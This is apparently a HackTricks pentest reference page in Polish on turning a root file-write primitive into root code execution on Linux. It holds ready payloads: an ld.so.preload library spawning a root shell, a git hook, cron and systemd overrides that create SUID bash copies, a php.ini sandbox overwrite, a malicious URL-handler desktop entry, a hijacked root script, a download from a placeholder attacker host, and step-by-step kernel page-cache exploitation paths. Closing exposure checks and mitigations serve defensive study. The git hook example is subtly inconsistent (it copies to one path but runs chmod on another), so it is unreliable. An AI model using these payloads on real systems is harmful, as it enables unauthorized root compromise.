# Dowolny zapis do pliku jako root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ten plik działa podobnie jak zmienna środowiskowa **`LD_PRELOAD`**, ale działa również w **plikach binarnych SUID**.\
Jeśli możesz go utworzyć lub zmodyfikować, możesz po prostu dodać **ścieżkę do biblioteki, która zostanie załadowana** przy każdym wykonywanym pliku binarnym.

Na przykład: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) to **skrypty**, które są **uruchamiane** podczas różnych **zdarzeń** w repozytorium git, takich jak utworzenie commita czy merge... Jeśli więc **uprzywilejowany skrypt lub użytkownik** często wykonuje te działania i możliwy jest **zapis w folderze `.git`**, można to wykorzystać do **privesc**.

Na przykład można **wygenerować skrypt** w repozytorium git w **`.git/hooks`**, aby był zawsze wykonywany po utworzeniu nowego commita:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Pliki Cron i zadań czasowych

Jeśli możesz **zapisywać pliki związane z Cronem, które wykonuje root**, zwykle możesz uzyskać code execution przy następnym uruchomieniu zadania. Interesujące cele obejmują:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Własny crontab roota w `/var/spool/cron/` lub `/var/spool/cron/crontabs/`
- Timery `systemd` oraz usługi, które uruchamiają

Szybkie sprawdzenia:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Typowe ścieżki nadużyć:

- **Dodanie nowego zadania root cron** do `/etc/crontab` lub pliku w `/etc/cron.d/`
- **Zastąpienie skryptu** już wykonywanego przez `run-parts`
- **Wstawienie backdoora do istniejącego celu timera** poprzez modyfikację uruchamianego przez niego skryptu lub pliku binarnego

Minimalny przykład payloadu cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Jeśli możesz zapisywać tylko w katalogu cron używanym przez `run-parts`, umieść tam plik wykonywalny:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Uwagi:

- `run-parts` zwykle ignoruje nazwy plików zawierające kropki, dlatego preferuj nazwy takie jak `backup` zamiast `backup.sh`.
- Niektóre dystrybucje używają `anacron` lub timerów `systemd` zamiast klasycznego cron, ale idea abuse jest taka sama: **zmodyfikuj to, co root wykona później**.

### Pliki Service i Socket

Jeśli możesz zapisywać **pliki unit `systemd`** lub pliki, do których się odwołują, możesz uzyskać code execution jako root poprzez przeładowanie i ponowne uruchomienie unitu albo oczekiwanie na uruchomienie ścieżki aktywacji service/socket.

Interesujące cele obejmują:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Nadpisania typu drop-in w `/etc/systemd/system/<unit>.d/*.conf`
- Skrypty/binaria service wskazane przez `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Zapisywalne ścieżki `EnvironmentFile=` ładowane przez service uruchamiany jako root

Szybkie sprawdzenia:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Typowe ścieżki nadużyć:

- **Nadpisanie `ExecStart=`** w należącej do roota jednostce service, którą możesz modyfikować
- **Dodanie drop-in override** z malicious `ExecStart=` i wcześniejsze wyczyszczenie starego wpisu
- **Dodanie backdoora do skryptu/pliku binarnego** już wskazywanego przez jednostkę
- **Przejęcie socket-activated service** przez modyfikację odpowiedniego pliku `.service`, który uruchamia się, gdy socket otrzyma połączenie

Przykładowy malicious override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Typowy przebieg aktywacji:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Jeśli nie możesz samodzielnie zrestartować usług, ale możesz edytować jednostkę aktywowaną przez socket, może wystarczyć **oczekiwanie na połączenie klienta**, aby uruchomić usługę z backdoorem jako root.

### Nadpisanie restrykcyjnego `php.ini` używanego przez uprzywilejowany sandbox PHP

Niektóre niestandardowe daemony weryfikują kod PHP dostarczony przez użytkownika, uruchamiając `php` z **restrykcyjnym `php.ini`** (na przykład `disable_functions=exec,system,...`). Jeśli kod uruchamiany w sandboxie nadal ma **dowolną możliwość zapisu** (taką jak `file_put_contents`) i możesz uzyskać dostęp do **dokładnej ścieżki `php.ini`** używanej przez daemona, możesz **nadpisać tę konfigurację**, aby znieść ograniczenia, a następnie przesłać drugi payload uruchamiany z podwyższonymi uprawnieniami.<sup>[[2]](#references)</sup>

Typowy przebieg:

1. Pierwszy payload nadpisuje konfigurację sandboxa.
2. Drugi payload wykonuje kod po ponownym włączeniu niebezpiecznych funkcji.

Minimalny przykład (zastąp ścieżkę używaną przez daemona):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Jeśli daemon działa jako root (lub przeprowadza walidację przy użyciu ścieżek należących do root), drugie wykonanie uzyskuje kontekst root. Jest to zasadniczo **privilege escalation via config overwrite**, gdy sandboxed runtime nadal może zapisywać pliki.

### binfmt_misc

Plik znajdujący się w `/proc/sys/fs/binfmt_misc` wskazuje, który binary powinien wykonywać pliki danego typu. TODO: sprawdzić wymagania potrzebne do wykorzystania tego mechanizmu w celu uruchomienia rev shell po otwarciu pliku popularnego typu.

### Overwrite schema handlers (like http: or https:)

Atakujący posiadający uprawnienia do zapisu w katalogach konfiguracyjnych ofiary może łatwo zastępować lub tworzyć pliki zmieniające zachowanie systemu, co prowadzi do niezamierzonego code execution. Modyfikując plik `$HOME/.config/mimeapps.list`, aby wskazywał HTTP i HTTPS URL handlers na złośliwy plik (np. ustawiając `x-scheme-handler/http=evil.desktop`), atakujący zapewnia, że **kliknięcie dowolnego linku http lub https uruchamia code określony w tym pliku `evil.desktop`**. Na przykład po umieszczeniu poniższego złośliwego code w pliku `evil.desktop` w `$HOME/.local/share/applications`, każde kliknięcie zewnętrznego URL uruchamia osadzoną command:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Więcej informacji znajdziesz w [**tym poście**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), w którym wykorzystano tę realną vulnerability.

### Root uruchamiający skrypty/pliki binarne zapisywalne przez użytkownika

Jeśli uprzywilejowany workflow uruchamia coś takiego jak `/bin/sh /home/username/.../script` (lub dowolny plik binarny znajdujący się w katalogu należącym do nieuprzywilejowanego użytkownika), możesz to przejąć:<sup>[[1]](#references)</sup>

- **Wykryj uruchomienie:** monitoruj procesy za pomocą [pspy](https://github.com/DominicBreuker/pspy), aby wykryć root uruchamiający ścieżki kontrolowane przez użytkownika:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Potwierdź możliwość zapisu:** upewnij się, że zarówno docelowy plik, jak i jego katalog należą do Twojego użytkownika lub są przez niego zapisywalne.
- **Przejmij docelowy plik:** wykonaj kopię zapasową oryginalnego pliku binarnego/skryptu i umieść payload tworzący powłokę SUID (lub wykonujący dowolną inną akcję z uprawnieniami root), a następnie przywróć uprawnienia:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (np. naciśnięcie przycisku UI, który uruchamia helper). Gdy root ponownie wykona przejętą ścieżkę, pobierz escalated shell za pomocą `./rootshell -p`.

### Modyfikacja pliku uprzywilejowanego wyłącznie w page cache

Niektóre błędy kernela nie modyfikują pliku **na dysku**. Zamiast tego pozwalają modyfikować wyłącznie kopię **page cache** odczytywalnego pliku. Jeśli można obrać za cel plik binarny **setuid** lub inny plik wykonywany przez **root**, następne wykonanie może uruchomić kontrolowane przez atakującego bajty z pamięci i doprowadzić do eskalacji uprawnień, mimo że hash pliku na dysku pozostał niezmieniony.

Warto traktować to jako **prymityw zapisu do pliku wyłącznie w czasie działania**:

- **Dysk pozostaje czysty**: inode i bajty na dysku nie zmieniają się
- **Pamięć jest zmodyfikowana**: procesy odczytujące lub wykonujące stronę z cache otrzymują zawartość zmodyfikowaną przez atakującego
- **Efekt jest tymczasowy**: zmiana znika po restarcie lub usunięciu strony z cache

Ten prymityw znajduje się pomiędzy klasycznym **arbitrary file write** a starszymi błędami wykorzystującymi **page cache**, takimi jak Dirty COW / Dirty Pipe:

- Dirty COW opierał się na race condition
- Dirty Pipe miał ograniczenia dotyczące pozycji zapisu
- Prymityw ograniczony do page cache może być bardziej niezawodny, jeśli podatna ścieżka zapewnia bezpośredni zapis do buforowanych stron mapowanych z pliku

#### Generic privesc flow

1. Uzyskaj kernel primitive umożliwiający zapis do stron **file-backed page cache**
2. Użyj go przeciwko **odczytywalnemu uprzywilejowanemu plikowi binarnemu** lub innemu plikowi wykonywanemu przez root
3. Wywołaj wykonanie **zanim** strona zostanie usunięta z cache
4. Uzyskaj code execution jako root, podczas gdy plik na dysku nadal wygląda na niezmodyfikowany

Typowe cele o wysokiej wartości:

- Pliki binarne **setuid-root**
- Helpery uruchamiane przez **root services**
- Pliki binarne często wykonywane z poziomu **containers** współdzielących kernel/page cache hosta

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) jest dobrym przykładem tej klasy. Podatna ścieżka znajdowała się w userspace API kryptografii Linuxa (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` może przenosić referencje do stron page cache z odczytywalnego pliku do scatterlisty crypto TX
- ścieżka deszyfrowania `algif_aead` in-place ponownie wykorzystywała bufory źródłowe i docelowe
- `authencesn` następnie zapisywał do obszaru tagu docelowego
- gdy ten obszar nadal wskazywał na spliced file-backed pages, zapis trafiał do **page cache pliku docelowego**

Dlatego interesującą techniką nie jest samo CVE, lecz wzorzec:

- **dostarczyć file-backed cache pages do kernel subsystem**
- sprawić, aby subsystem **potraktował je jako writable output**
- wywołać niewielkie, kontrolowane nadpisanie w pamięci

Publiczny PoC używał powtarzanych **4-byte writes**, aby spatchować `/usr/bin/su` w pamięci, a następnie go wykonać.

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) pokazuje inną odmianę tego samego wzorca **page-cache-only write-to-root**, ale tym razem sinkiem jest **IPsec ESP decrypt**, a nie `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Najważniejszą techniką jest etap **metadata-laundering**:

- `splice()` umieszcza **read-only file-backed page-cache page** w pakiecie ESP-in-UDP
- oryginalne zabezpieczenie DirtyFrag oznaczało ten skb za pomocą `SKBFL_SHARED_FRAG`, aby `esp_input()` **kopiował dane przed deszyfrowaniem**
- netfilter `TEE` duplikuje pakiet przez `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone zachowuje **tę samą fizyczną referencję do page-cache**, ale traci `SKBFL_SHARED_FRAG`
- `esp_input()` uznaje więc clone za bezpieczny i wykonuje deszyfrowanie **in-place `cbc(aes)`** na stronie file-backed

Wniosek dla reviewera wykracza poza samo CVE: jeśli mitigation zależy od **skb/page metadata** przy podejmowaniu decyzji, czy operacja musi najpierw wykonać copy, każda ścieżka **clone/copy, która zachowuje backing page, ale usuwa metadata**, może po cichu ponownie otworzyć prymityw zapisu.

Typowy przebieg exploitation:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` w celu uzyskania **`CAP_NET_ADMIN` wewnątrz prywatnego network namespace**
2. Podnieś loopback i zainstaluj regułę **netfilter `TEE`** w `mangle/OUTPUT`
3. Zainstaluj **XFRM ESP transport SAs** za pomocą `NETLINK_XFRM`
4. Zakoduj każde docelowe słowo 4-byte w polu `seq_hi` SA (trick wyboru słowa z DirtyFrag)
5. Wyślij spliced pakiet ESP-in-UDP, aby **TEE clone** dotarł do `esp_input()` i wykonał deszyfrowanie **in-place**
6. Powtarzaj, aż kopia `/usr/bin/su` w page cache lub innego uprzywilejowanego pliku wykonywalnego będzie zawierać code kontrolowany przez atakującego

Z punktu widzenia działania wpływ jest taki sam jak w przykładzie `AF_ALG`: plik na dysku pozostaje czysty, ale `execve()` wykorzystuje **zmodyfikowane bajty page cache** i zapewnia root.

Przydatne kontrole ekspozycji dla tego wariantu:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Krótkoterminowe ograniczenie powierzchni ataku jest tutaj również specyficzne dla ścieżki: aktualizacja do kernela zawierającego `48f6a5356a33` naprawia ścieżkę klonowania, natomiast zablokowanie autoload `xt_TEE` usuwa **krok prania flag**, a zablokowanie `esp4` / `esp6` usuwa **ujście deszyfrowania**.

#### Ekspozycja i wyszukiwanie

Jeśli podejrzewasz tę klasę błędów, nie polegaj wyłącznie na kontrolach integralności dysku. Sprawdź również:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` może być ładowany i wyładowywany jako moduł
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfejs jest wbudowany w kernel
- binaria setuid są dobrymi celami, ponieważ poprawka dotycząca wyłącznie page cache może wystarczyć, aby zamienić lokalny foothold w uprawnienia root

#### Redukcja attack surface dla ścieżki `algif_aead`

Jeśli podatny interfejs jest dostarczany przez moduł, który można ładować:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Jeśli zostanie skompilowane w jądrze, zgłaszano, że niektóre disclosures blokują ścieżkę init za pomocą:
```bash
initcall_blacklist=algif_aead_init
```
Ten rodzaj mitigacji warto pamiętać także w przypadku innych kernel LPE: jeśli exploit zależy od konkretnego opcjonalnego interfejsu, wyłączenie lub zablokowanie tego interfejsu może przerwać ścieżkę exploita, nawet zanim będzie dostępna pełna aktualizacja kernela.

## References

- [1] [HTB Bamboo – przejęcie skryptu uruchamianego jako root w zapisywalnym przez użytkownika katalogu PaperCut](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Ujawnienie Openwall oss-security dotyczące CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — advisory dotyczące CVE-2026-31431](https://copy.fail/)
- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repozytorium DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: analiza i wykorzystanie wariantu Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: preserve `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux earlier mitigation: set `SKBFL_SHARED_FRAG` for spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
